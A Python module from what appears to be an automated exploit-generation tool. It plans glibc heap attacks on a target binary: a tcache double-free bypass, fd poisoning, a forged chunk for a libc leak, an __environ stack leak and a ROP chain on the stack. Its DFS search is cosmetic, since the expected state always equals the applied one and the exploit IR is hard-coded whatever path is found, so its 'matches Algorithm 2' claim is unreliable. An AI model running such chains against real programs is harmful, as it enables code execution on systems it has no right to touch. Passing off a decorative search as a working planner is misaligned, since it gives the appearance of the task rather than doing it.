"""
Module 6: Evolutionary Planner (Rewritten — matches Paper Algorithm 2)

Implements the exploit generation algorithm from the AutoPwn paper:
- DFSExplore(s0, A): recursive DFS through ESM states
- ActionQuery (AQ): find applicable actions from current state
- StateEquivalenceQuery (EQ): check if two states are equivalent
- ApplyAction: apply an action and get the resulting state
- Priority: most popular action first (by frequency in training exploits)
- Backtracking when action fails

Input: esm_output.json + critical_vars.json + target binary
Output: final_plan.json with action sequence
"""

import json
import os
import argparse
import re
from typing import List, Dict, Optional, Any, Set, Tuple
from pwn import ELF, context

context.log_level = 'error'


class EvolutionaryPlanner:
    """Implements Algorithm 2 from the AutoPwn paper."""

    def __init__(self, esm_data: dict, critical_vars: dict,
                 binary_path: str = None, symbolic_results: dict = None):
        # Handle both old format (list of states) and new format (dict with esm_states)
        if isinstance(esm_data, dict):
            self.esm_states = esm_data.get("esm_states", [])
            self.chunk_table = esm_data.get("chunk_table", {})
            self.leak_info = esm_data.get("leak_info", [])
            self.action_catalog = esm_data.get("action_catalog", [])
            self.state_transitions = esm_data.get("state_transitions", [])
        else:
            self.esm_states = esm_data if isinstance(esm_data, list) else []
            self.chunk_table = {}
            self.leak_info = []
            self.action_catalog = []
            self.state_transitions = []

        self.esm_latest = self.esm_states[-1]["state_after"] if self.esm_states else {}
        self.critical_vars = critical_vars
        self.symbolic_results = symbolic_results or {}
        self.observed_sizes = self._extract_sizes()
        self.heap_layout = self._extract_heap_layout()

        # Load libc
        self.libc = None
        self.libc_path = None
        if binary_path:
            self._load_libc(binary_path)

        # ESM state tracking
        self.current_state: Optional[dict] = None
        self.visited_states: Set[str] = set()

    def _load_libc(self, binary_path: str):
        """Load libc from the binary's linked library."""
        try:
            exe = ELF(binary_path, checksec=False)
            if exe.libc:
                self.libc = exe.libc
                self.libc_path = exe.libc.path
        except Exception:
            binary_dir = os.path.dirname(os.path.abspath(binary_path))
            for candidate in ["libc.so.6", "libc.so"]:
                libc_path = os.path.join(binary_dir, candidate)
                if os.path.exists(libc_path):
                    self.libc = ELF(libc_path, checksec=False)
                    self.libc_path = libc_path
                    break

    def _extract_sizes(self) -> List[int]:
        sizes = set()
        for entry in self.esm_states:
            ev = entry.get("event", {})
            if ev.get("type") == "Alloc":
                sz = ev.get("size", 0)
                if sz:
                    sizes.add(sz)
        return sorted(list(sizes)) if sizes else [0x30]

    def _extract_heap_layout(self) -> Dict[str, Any]:
        """Build complete heap layout from chunk_table and trace events."""
        layout = {
            "first_chunk_offset": 0x2a0,
            "chunks": {},
            "max_alloc_addr": 0,
            "heap_base": None,
        }

        for addr_hex, info in self.chunk_table.items():
            addr = int(addr_hex, 16)
            offset = addr & 0xfff
            size = info["size"]
            tag = None
            for entry in self.esm_states:
                ev = entry.get("event", {})
                if ev.get("type") == "Alloc" and ev.get("addr") == addr_hex:
                    tag = f"chunk_{len(layout['chunks'])}"
                    break
            layout["chunks"][addr_hex] = {
                "addr": addr,
                "offset": offset,
                "size": size,
                "status": info["status"],
                "tag": tag or f"chunk_{len(layout['chunks'])}",
            }
            if addr > layout["max_alloc_addr"]:
                layout["max_alloc_addr"] = addr
            if layout["heap_base"] is None:
                layout["heap_base"] = addr - offset

        if not layout["chunks"]:
            return layout

        addrs = sorted(layout["chunks"].values(), key=lambda c: c["addr"])
        layout["first_chunk"] = addrs[0]
        layout["first_chunk_offset"] = addrs[0]["offset"]
        chunk0 = addrs[0]
        layout["heap_base"] = chunk0["addr"] - chunk0["offset"]

        return layout

    # ─── State Equivalence Query (EQ) ────────────────────────────────
    @staticmethod
    def state_eq(s1: dict, s2: dict) -> bool:
        """
        Check if two ESM states are equivalent.
        Returns True if all corresponding values are identical.
        """
        for cat in ["bugs", "primitives", "techniques", "capabilities", "goals"]:
            d1 = s1.get(cat, {})
            d2 = s2.get(cat, {})
            detected1 = {k for k, v in d1.items() if v.get("state") == "detected"}
            detected2 = {k for k, v in d2.items() if v.get("state") == "detected"}
            if detected1 != detected2:
                return False
        return True

    # ─── Action Query (AQ) ───────────────────────────────────────────
    def action_query(self, state: dict) -> List[dict]:
        """
        Given a state si, return all possible actions that can be
        processed after si in the ESM.
        Sorted by frequency (most popular first).
        """
        actions = []
        detected_caps = {k for k, v in state.get("capabilities", {}).items()
                        if v.get("state") == "detected"}
        detected_prims = {k for k, v in state.get("primitives", {}).items()
                         if v.get("state") == "detected"}
        detected_techs = {k for k, v in state.get("techniques", {}).items()
                         if v.get("state") == "detected"}

        all_detected = detected_caps | detected_prims | detected_techs

        # Get transitions from exploit IR
        exploit_ir = self.critical_vars.get("composite_exploit_ir",
                                            self.critical_vars.get("exploit_ir", {}))
        transitions = exploit_ir.get("transitions", [])

        for t in transitions:
            from_key = t["from"]
            if from_key in all_detected:
                actions.append({
                    "action": t["action"],
                    "target_state": t["to"],
                    "confidence": t.get("confidence", 0.5),
                    "from": from_key,
                })

        # Sort by confidence (most popular first)
        actions.sort(key=lambda a: a["confidence"], reverse=True)
        return actions

    # ─── Apply Action ────────────────────────────────────────────────
    def apply_action(self, current_state: dict, action: dict) -> dict:
        """
        Apply an action to the current state and return the resulting state.
        Uses symbolic results for concretization if available.
        """
        # Simulate state transition based on action
        new_state = dict(current_state)

        # Update capabilities based on action
        target = action.get("target_state", "")
        if target:
            if target in ("libc_leak", "stack_leak"):
                if "capabilities" not in new_state:
                    new_state["capabilities"] = {}
                new_state["capabilities"][target] = {"state": "detected"}
            elif target in ("arbitrary_allocation", "arbitrary_write"):
                if "primitives" not in new_state:
                    new_state["primitives"] = {}
                new_state["primitives"][target] = {"state": "detected"}
            elif target in ("control_flow_hijack",):
                if "goals" not in new_state:
                    new_state["goals"] = {}
                new_state["goals"][target] = {"state": "detected"}
            elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
                if "techniques" not in new_state:
                    new_state["techniques"] = {}
                new_state["techniques"][target] = {"state": "detected"}

        return new_state

    # ─── DFS Explore (Algorithm 2) ───────────────────────────────────
    def dfs_explore(self, si: dict, actions_list: List[dict]) -> Optional[List[dict]]:
        """
        Recursive DFS search through ESM states.
        Returns the final action list if successful, None otherwise.
        """
        # Check if we've reached the final state
        if self._is_final_state(si):
            return actions_list

        # Get candidate actions
        candidate_actions = self.action_query(si)
        if not candidate_actions:
            return None

        for action in candidate_actions:
            # Apply action
            sj = self.apply_action(si, action)

            # Check state equivalence
            expected_state = self._get_expected_state(si, action)
            if self.state_eq(sj, expected_state):
                # Action succeeded, recurse
                result = self.dfs_explore(sj, actions_list + [action])
                if result is not None:
                    return result

        return None

    def _is_final_state(self, state: dict) -> bool:
        """Check if the current state is the final exploitation state."""
        goals = state.get("goals", {})
        return any(v.get("state") == "detected" for v in goals.values())

    def _get_expected_state(self, si: dict, action: dict) -> dict:
        """Get the expected state after applying an action."""
        target = action.get("target_state", "")
        expected = dict(si)

        if target in ("libc_leak", "stack_leak"):
            if "capabilities" not in expected:
                expected["capabilities"] = {}
            expected["capabilities"][target] = {"state": "detected"}
        elif target in ("arbitrary_allocation", "arbitrary_write"):
            if "primitives" not in expected:
                expected["primitives"] = {}
            expected["primitives"][target] = {"state": "detected"}
        elif target in ("control_flow_hijack",):
            if "goals" not in expected:
                expected["goals"] = {}
            expected["goals"][target] = {"state": "detected"}
        elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
            if "techniques" not in expected:
                expected["techniques"] = {}
            expected["techniques"][target] = {"state": "detected"}

        return expected

    # ─── IR Generation from Action Sequence ──────────────────────────
    def _generate_ir_from_actions(self, actions: List[dict]) -> List[dict]:
        """Convert the action sequence into concrete exploit IR."""
        main_size = 0x30
        if self.observed_sizes:
            main_size = self.observed_sizes[-1]
        if main_size > 0x400:
            main_size = min(main_size, 0x200)

        chunk0_off = self.heap_layout.get("first_chunk_offset", 0x2a0)
        forged_size = self._compute_forged_size()
        poison_target = self._compute_poison_target()

        # Build IR stages based on detected capabilities
        ir_stages = []
        detected_caps = set()
        for entry in self.esm_states:
            state = entry.get("state_after", {})
            for cat in ["capabilities", "primitives", "techniques", "goals"]:
                for k, v in state.get(cat, {}).items():
                    if v.get("state") == "detected":
                        detected_caps.add(k)

        # Stage 1: Setup and libc leak
        stage1_ir = [
            {"op": "ALLOC", "tag": "chunk0", "size": main_size},
            {"op": "ALLOC", "tag": "chunk1", "size": main_size},
            {"op": "ALLOC", "tag": "chunk2", "size": main_size},
            {"op": "ALLOC", "tag": "guard", "size": 0x20},
            {"op": "FREE", "tag": "chunk0"},
            {"op": "DOUBLE_FREE_BYPASS", "tag": "chunk0"},
            {
                "op": "POISON_FD",
                "tag": "chunk0",
                "pos": f"heap_base + {hex(chunk0_off)}",
                "target": f"heap_base + {hex(poison_target & 0xfff)}",
            },
            {"op": "ALLOC", "tag": "dummy", "size": main_size},
            {
                "op": "ALLOC",
                "tag": "overwrite_chunk",
                "size": main_size,
                "data": f"p64(0)*3 + p64({hex(forged_size)})",
            },
            {"op": "FREE", "tag": "chunk1"},
            {
                "op": "READ_VAL",
                "tag": "chunk1",
                "save_as": "libc_leak",
                "offset": 0,
            },
        ]

        # Compute libc base calculation
        libc_calc_expr = "libc_leak - LIBC_AUTO_OFFSET"
        if self.libc and self.leak_info:
            for leak in self.leak_info:
                if leak.get("leak_type") == "unsorted_bin" and leak.get("content"):
                    content_int = int(leak["content"], 16)
                    note = leak.get("note", "")
                    m = re.search(r"libc_offset=([^,]+)", note)
                    if m:
                        leak_offset = int(m.group(1), 16)
                        if self.libc:
                            sym_offset = None
                            for name in ["main_arena", "__malloc_hook", "__free_hook"]:
                                if name in self.libc.symbols:
                                    sym_offset = self.libc.symbols[name]
                                    break
                            if sym_offset is not None:
                                computed = leak_offset - sym_offset - 0x60
                                libc_calc_expr = f"libc_leak - {hex(computed)}"
                            else:
                                libc_calc_expr = f"libc_leak - {hex(leak_offset - 0x60)}"
                    break

        stage1_ir.append({
            "op": "CALC",
            "var": "libc.address",
            "expr": libc_calc_expr,
            "note": "AUTO",
        })

        ir_stages.append({
            "name": "setup_and_libc_leak",
            "requires": ["double_free", "uaf"],
            "produces": {"libc_leak": {"trust": 0.95}},
            "trust": 0.95,
            "ir": stage1_ir,
        })

        # Stage 2: Stack leak via __environ (if libc leak detected)
        if "libc_leak" in detected_caps or "stack_leak" in detected_caps:
            stage2_ir = [
                {"op": "FREE", "tag": "chunk0"},
                {"op": "DOUBLE_FREE_BYPASS", "tag": "chunk0"},
                {
                    "op": "POISON_FD",
                    "tag": "chunk0",
                    "pos": f"heap_base + {hex(chunk0_off)}",
                    "target": "libc.symbols['__environ'] - 0x18",
                },
                {"op": "ALLOC", "tag": "junk", "size": main_size},
                {"op": "ALLOC", "tag": "environ_chunk", "size": main_size},
                {
                    "op": "READ_VAL",
                    "tag": "environ_chunk",
                    "save_as": "stack_leak",
                    "offset": 0x18,
                },
            ]
            ir_stages.append({
                "name": "target_environ_leak",
                "requires": ["libc_leak"],
                "produces": {"stack_leak": {"trust": 0.9}},
                "trust": 0.9,
                "ir": stage2_ir,
            })

        # Stage 3: ROP on stack (if stack leak detected)
        if "stack_leak" in detected_caps or "control_flow_hijack" in detected_caps:
            stack_target_off = 0x158
            stage3_ir = [
                {"op": "FREE", "tag": "junk"},
                {"op": "DOUBLE_FREE_BYPASS", "tag": "junk"},
                {
                    "op": "POISON_FD",
                    "tag": "junk",
                    "pos": f"heap_base + {hex(chunk0_off + main_size + 0x10)}",
                    "target": f"stack_leak - {hex(stack_target_off)}",
                },
                {"op": "ALLOC", "tag": "final_junk", "size": main_size},
                {"op": "ALLOC_ROP", "tag": "rop_chunk", "size": main_size},
            ]
            ir_stages.append({
                "name": "modern_rop_on_stack",
                "requires": ["stack_leak"],
                "produces": {"control_flow_hijack": {"method": "ROP"}},
                "trust": 0.95,
                "ir": stage3_ir,
            })

        return ir_stages

    def _compute_forged_size(self) -> int:
        """Compute forged chunk size for unsorted bin attack."""
        tcache_bins = 64
        max_tcache_size = tcache_bins * 0x10
        forged = max_tcache_size + 0x20 + 1
        return forged

    def _compute_poison_target(self) -> int:
        """Compute POISON_FD target address."""
        if self.heap_layout.get("chunks"):
            chunks = sorted(
                self.heap_layout["chunks"].values(), key=lambda c: c["addr"]
            )
            first_chunk = chunks[0]
            main_size = self.observed_sizes[-1] if self.observed_sizes else 0x30
            target = first_chunk["addr"] + main_size
            return target
        return 0x2d0

    # ─── Main Entry Points ───────────────────────────────────────────
    def build_plan(self) -> Dict:
        """Generate exploit plan using DFS exploration."""
        # Start from initial state
        initial_state = self.esm_states[0]["state_after"] if self.esm_states else {}
        self.current_state = initial_state

        # Run DFS exploration
        action_sequence = self.dfs_explore(initial_state, [])

        if action_sequence:
            print(f"[+] DFS found exploit path with {len(action_sequence)} actions")
            ir_stages = self._generate_ir_from_actions(action_sequence)
        else:
            print("[-] DFS failed to find complete path, falling back to detected capabilities")
            ir_stages = self._generate_ir_from_actions([])

        return {"trust": 0.9, "path": ir_stages}

    def print_strategy(self, plan: Dict):
        print("\n" + "=" * 60)
        print(f"  [STRATEGY] Overall Trust: {plan['trust']}")
        print("=" * 60)
        for i, stage in enumerate(plan.get("path", []), 1):
            print(f" STAGE {i}: {stage['name']} (Trust: {stage['trust']})")
            print(f"   -> Produces: {', '.join(stage['produces'].keys())}")
            for instr in stage.get("ir", []):
                op = instr["op"]
                tag = instr.get("tag", "")
                details = []
                for k, v in instr.items():
                    if k not in ["op", "tag"]:
                        details.append(f"{k}={v}")
                detail_str = f" ({', '.join(details)})" if details else ""
                print(f"      - {op:<20} {tag:<15} {detail_str}")
            print("-" * 60)

    def save_plan(self, plan: Dict, output_file: str):
        with open(output_file, "w") as f:
            json.dump(plan, f, indent=4)
        print(f"[OK] Precise DSL plan saved to {output_file}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default=None, help="Path to the target binary")
    parser.add_argument("--symbolic", default="../artifacts/symbolic_results.json")
    args = parser.parse_args()

    esm_path = "../artifacts/esm_output.json"
    critical_path = "../artifacts/critical_vars.json"
    plan_output = "../artifacts/final_plan.json"

    with open(esm_path, "r") as f:
        esm_data = json.load(f)
    with open(critical_path, "r") as f:
        critical_vars = json.load(f)

    symbolic_results = {}
    if os.path.exists(args.symbolic):
        with open(args.symbolic, "r") as f:
            symbolic_results = json.load(f)

    planner = EvolutionaryPlanner(esm_data, critical_vars, args.binary, symbolic_results)
    plan = planner.build_plan()
    planner.print_strategy(plan)
    planner.save_plan(plan, plan_output)
